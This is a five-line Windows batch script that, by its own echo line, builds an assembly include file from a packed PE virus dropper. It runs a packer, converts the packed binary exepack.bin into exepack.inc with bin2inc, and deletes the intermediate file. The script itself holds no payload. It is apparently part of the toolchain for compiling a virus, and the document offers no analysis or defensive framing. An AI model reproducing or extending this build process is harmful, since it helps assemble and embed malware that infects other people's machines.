@echo off
echo build INC file of packed pe virus dropper
packer
bin2inc @packed_dropper exepack.bin ..\exepack.inc
del exepack.bin
